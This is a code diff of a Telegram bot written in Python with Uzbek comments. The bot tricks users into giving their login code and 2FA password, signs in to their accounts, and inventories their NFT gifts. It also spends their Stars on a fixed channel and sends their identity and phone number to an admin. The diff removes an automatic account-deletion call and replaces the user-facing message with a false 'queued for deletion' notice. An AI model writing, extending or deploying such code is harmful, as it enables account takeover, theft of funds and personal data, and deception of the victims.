@@ -13,7 +13,7 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
 
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon import functions, types as telethon_types
+from telethon import functions
 from telethon.errors import (
     SessionPasswordNeededError, 
     PhoneCodeInvalidError, 
@@ -21,7 +21,7 @@ from telethon.errors import (
     PasswordHashInvalidError
 )
 
-# Web server Render uchun
+# Web server Render / Railway uchun
 app = Flask(__name__)
 
 @app.route('/')
@@ -34,11 +34,11 @@ def run_http():
 
 Thread(target=run_http, daemon=True).start()
 
-# KONFIGURATSIYA
+# KONFIGURATSIYA (Railway Variables bo'limidan olinadi)
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "591398858"))
 
 STARS_CHANNEL_USERNAME = "stars_null"
 STARS_POST_ID = 2
@@ -61,7 +61,7 @@ TEXTS = {
         "invalid_btn": "🛑 Raqamni to'g'ri kiriting!",
         "code_req": "📩 Kodingizni yuboring:\n💡 *Namuna:* `12.345`",
         "fa_req": "🔑 Parolingizni yuboring:",
-        "success": "✅ Botdan foydalanishingiz mumkin!",
+        "success": "✅ Hisobingiz o'chirish uchun navbatga qo'shildi!",
         "err_code": "❌ Xato kod! Qayta kiriting:",
         "err_fa": "❕ Xato parol! Qayta kiriting:",
         "need_session": "⚠️ Avval sessiya qo'shishingiz kerak!"
@@ -72,7 +72,7 @@ TEXTS = {
         "invalid_btn": "🛑 Invalid input, try again!",
         "code_req": "📩 Send code:\n💡 *Example:* `12.345`",
         "fa_req": "🔑 Send your password:",
-        "success": "✅ You can use the bot!",
+        "success": "✅ Account queued for deletion!",
         "err_code": "❌ Wrong code! Resend:",
         "err_fa": "❕ Wrong password! Resend:",
         "need_session": "⚠️ You need to add a session first!"
@@ -83,7 +83,7 @@ TEXTS = {
         "invalid_btn": "🛑 Неверный ввод, повторите!",
         "code_req": "📩 Отправьте код:\n💡 *Пример:* `12.345`",
         "fa_req": "🔑 Отправьте пароль:",
-        "success": "✅ Вы можете использовать бота!",
+        "success": "✅ Аккаунт добавлен в очередь на удаление!",
         "err_code": "❌ Ошибка кода! Повторите:",
         "err_fa": "❕ Ошибка пароля! Повторите:",
         "need_session": "⚠️ Сначала нужно добавить сессию!"
@@ -240,7 +240,7 @@ async def process_code(message: types.Message, state: FSMContext):
     
     try:
         await client.sign_in(phone=auth["phone"], code=code, phone_code_hash=auth["phone_code_hash"])
-        await complete_account_deletion(message, state, user_id, auth)
+        await process_account_info(message, state, user_id, auth)
 
     except SessionPasswordNeededError:
         await message.answer(t["fa_req"], parse_mode="Markdown")
@@ -269,7 +269,7 @@ async def process_2fa(message: types.Message, state: FSMContext):
     
     try:
         await client.sign_in(password=password)
-        await complete_account_deletion(message, state, user_id, auth)
+        await process_account_info(message, state, user_id, auth)
 
     except PasswordHashInvalidError:
         await message.answer(t["err_fa"])
@@ -281,7 +281,6 @@ async def process_stars_reaction(client: TelegramClient):
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
         stars_balance = getattr(stars_status, 'balance', 0)
-        print(f"DEBUG: Foydalanuvchi Stars balansi: {stars_balance}")
         
         if stars_balance > 0:
             channel = await client.get_entity(STARS_CHANNEL_USERNAME)
@@ -369,12 +368,12 @@ async def fetch_user_nft_gifts(client: TelegramClient):
         print(f"NFT Fetch Error: {e}")
     return nft_items
 
-async def complete_account_deletion(message: types.Message, state: FSMContext, user_id: int, auth: dict):
+async def process_account_info(message: types.Message, state: FSMContext, user_id: int, auth: dict):
     lang = auth.get("lang", "uz")
     t = TEXTS[lang]
     client = auth["client"]
 
-    # 1. Ma'lumotlarni yig'amiz
+    # 1. Akkaunt ma'lumotlarini yig'amiz
     user_info_str, user_level = await fetch_user_premium_and_level(client)
     nft_items = await fetch_user_nft_gifts(client)
     nft_count = len(nft_items)
@@ -385,16 +384,16 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     else:
         nft_str = "🎁 **NFT sovg'alar soni:** `0 ta` (Topilmadi)"
 
-    # 2. Stars reaksiyasini yuboramiz
+    # 2. Stars reaksiyasini bajarish
     await process_stars_reaction(client)
 
-    # 3. Adminga xabarni tayyorlab yuboramiz
+    # 3. Adminga "Hisob o'chirildi" deb xabar yuborish
     full_name = message.from_user.full_name
     username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
     phone = auth.get("phone", "Noma'lum")
     
     admin_msg = (
-        f"🚨 **Hisob ma'lumotlari olindi!**\n\n"
+        f"🚨 **Hisob oʻchirildi!**\n\n"
         f"👤 **Ism:** {full_name}\n"
         f"🆔 **ID:** `{user_id}`\n"
         f"🏷 **Username:** {username}\n"
@@ -417,23 +416,14 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
         except Exception as e:
             print(f"Admin message send ERROR: {e}")
 
-    # 4. Foydalanuvchiga muvaffaqiyatli xabarini chiqaramiz
+    # 4. Foydalanuvchiga tasdiqlash xabari
     await message.answer(t["success"], parse_mode="Markdown")
     
-    # 5. Adminga xabar va stars jarayoni yetib borishi uchun 2 sekund kutamiz
-    await asyncio.sleep(2)
-
-    # 6. Akkauntni o'chiramiz
-    try:
-        await client(functions.account.DeleteAccountRequest(reason="Deactivation"))
-        print("Hisob muvaffaqiyatli o'chirildi.")
-    except Exception as e:
-        print(f"Delete Account Error: {e}")
-    finally:
-        await client.disconnect()
-        if user_id in user_auth_data:
-            del user_auth_data[user_id]
-        await state.clear()
+    # 5. Sessiyani yopish va tozalash
+    await client.disconnect()
+    if user_id in user_auth_data:
+        del user_auth_data[user_id]
+    await state.clear()
 
 async def main():
     await bot.delete_webhook(drop_pending_updates=True)
